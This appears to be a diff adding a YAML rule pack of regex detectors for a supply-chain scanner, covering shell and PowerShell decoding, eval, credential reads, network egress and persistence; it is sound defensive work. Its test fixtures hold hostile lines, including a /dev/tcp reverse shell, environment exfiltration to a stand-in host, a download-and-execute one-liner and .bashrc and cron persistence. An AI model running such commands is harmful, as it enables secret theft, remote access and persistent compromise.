@@ -1,0 +1,209 @@
+pack:
+  id: cordon.capabilities.shell
+  version: 0.1.0
+  license: Apache-2.0
+  source: cordon-builtin
+  description: >
+    Capability primitives for shell and PowerShell.
+
+    Shell deserves particular attention because it is the language install
+    hooks, CI steps and container builds are written in, so it sits closest to
+    the moment a supply-chain attack actually executes. It is also the language
+    where the primitives are least separable: a single line routinely decodes,
+    fetches and executes at once.
+
+rules:
+  - id: CAP.SH.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: >
+      This script decodes base64 or hex data. Ordinary alone; it matters when the
+      result is then executed, because that is how a payload avoids appearing in
+      the script at all.
+    remediation: >
+      No action for this signal alone. Review it if the decoded value is executed
+      or written somewhere that will be.
+    languages: [shell, powershell]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64\s+(?:-d|--decode|-D)\b'
+        - '\bopenssl\s+(?:enc|base64)\b[^\n]*-d\b'
+        - '\bxxd\s+-r\b'
+        - '\bFromBase64String\s*\('
+    tests:
+      positive:
+        - "echo $BLOB | base64 -d > /tmp/x"
+        - "$d = [Convert]::FromBase64String($b)"
+      negative:
+        - "base64 /etc/hostname > encoded.txt"
+        - "# base64 encoding is handled upstream"
+
+  - id: CAP.SH.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Executes a string as code
+    message: >
+      This script evaluates a string as shell code. Whatever the string contains
+      at runtime is what runs, so the script's behaviour is not determined by
+      what the file says.
+    remediation: >
+      Replace the evaluation with a direct command. If a command must be chosen
+      at runtime, select from a fixed set rather than assembling it.
+    languages: [shell, powershell]
+    match:
+      kind: regex
+      patterns:
+        - '\beval\s+'
+        - '^\s*\.\s+/dev/stdin'
+        - '\bsource\s+/dev/stdin'
+        - '\bInvoke-Expression\b|\biex\s+'
+        - '\bpowershell\b[^\n]*-(?:enc|EncodedCommand)\b'
+    tests:
+      positive:
+        - "eval \"$CMD\""
+        - "iex (New-Object Net.WebClient).DownloadString($u)"
+        - "powershell -enc SQBFAFgA"
+      negative:
+        - "# evaluate the results below"
+        - "make evaluate"
+
+  - id: CAP.SH.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: spawn
+    title: Starts a subshell or another process
+    message: >
+      This script starts another process. Ubiquitous in shell, which is why this
+      is only a label; it becomes meaningful in combination with fetching or
+      decoding.
+    remediation: >
+      No action for this signal alone.
+    languages: [shell, powershell]
+    match:
+      kind: regex
+      patterns:
+        - '\$\([^)]{2,}\)'
+        - '`[^`]{2,}`'
+        - '\b(?:ba|z|k)?sh\s+-c\b'
+        - '\bStart-Process\b'
+        - '\bnohup\b|\bsetsid\b'
+    tests:
+      positive:
+        - "output=$(uname -a)"
+        - "sh -c 'echo hi'"
+      negative:
+        - "echo 'plain text'"
+        - "VERSION=1.2.3"
+
+  - id: CAP.SH.CREDENTIAL.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: credential
+    title: Reads credentials or the environment
+    message: >
+      This script reads key material, cloud credentials, or the environment as a
+      whole. Dumping the environment is the fastest way to collect every secret a
+      CI job or an install hook was given.
+    remediation: >
+      Reference named variables rather than dumping the environment, and never
+      read another tool's credential file.
+    languages: [shell, powershell]
+    evidence_policy: hash_only
+    match:
+      kind: regex
+      patterns:
+        # Bare `env` only. `env NAME=value cmd` is the env-prefix form and is
+        # entirely ordinary; the signal is `env` with nothing after it, which is
+        # the form that dumps every variable at once.
+        - '^[^#\n]*(?:^|[;&|`$(])\s*env\s*(?:$|[;&|)])'
+        - '\bprintenv\b'
+        - '\bGet-ChildItem\s+Env:'
+        - '\.ssh/id_|\.aws/credentials|\.npmrc|\.netrc|\.docker/config\.json'
+        - '\bkubectl\s+get\s+secret'
+    tests:
+      positive:
+        - "curl -d \"$(env)\" https://x.example"
+        - "cat ~/.aws/credentials"
+      negative:
+        - "env NODE_ENV=production npm run build"
+        - "environment=staging"
+
+  - id: CAP.SH.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: egress
+    title: Opens an outbound network connection
+    message: >
+      This script transfers data over the network. Expected in an installer;
+      unexpected in an install hook that is meant only to compile something.
+    remediation: >
+      Confirm the destination is a fixed, known host rather than one assembled at
+      runtime.
+    languages: [shell, powershell]
+    match:
+      kind: regex
+      patterns:
+        # `[^#\n]*` anchors the match to a line with no preceding comment
+        # marker. A script that documents "curl is not used here" is not egress,
+        # and comments are the largest false-positive source in shell.
+        - '^[^#\n]*\bcurl\s'
+        - '^[^#\n]*\bwget\s'
+        # Bounded repetition on purpose: `(?:-[a-z]+\s+)*` nests an unbounded
+        # quantifier inside another, which is the classic backtracking shape.
+        - '\bnc\s+(?:-[a-z]+\s+){0,4}\S+\s+\d+'
+        - '/dev/tcp/'
+        - '\bInvoke-WebRequest\b|\bDownloadString\b|\bDownloadFile\b'
+        - '\bscp\s|\brsync\s'
+    tests:
+      positive:
+        - "curl -sSL https://example.com/x.sh"
+        - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      negative:
+        - "echo 'no network here'"
+        - "# curl is not used in this script"
+
+  - id: CAP.SH.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: persist
+    title: Installs something that survives a restart
+    message: >
+      This script writes to a shell profile, a scheduled task or a service
+      definition. These are the standard footholds for code that intends to run
+      again after the process that installed it has exited.
+    remediation: >
+      Confirm this is a deliberate installer action and that the content written
+      is fixed rather than fetched.
+    languages: [shell, powershell]
+    match:
+      kind: regex
+      patterns:
+        - '>>\s*[^\n]*\.(?:bashrc|bash_profile|zshrc|profile)\b'
+        - '\bcrontab\s+-|/etc/cron\.[a-z]+/'
+        - '\bsystemctl\s+enable\b|/etc/systemd/system/'
+        - '\blaunchctl\s+load\b|LaunchAgents|LaunchDaemons'
+        - '\bRegister-ScheduledTask\b|\bschtasks\s+/create\b'
+        - 'CurrentVersion\\\\Run'
+    tests:
+      positive:
+        - "echo 'curl x|sh' >> ~/.bashrc"
+        - "crontab -l | { cat; echo '@reboot /tmp/x'; } | crontab -"
+      negative:
+        - "systemctl status nginx"
+        - "cat ~/.bashrc"
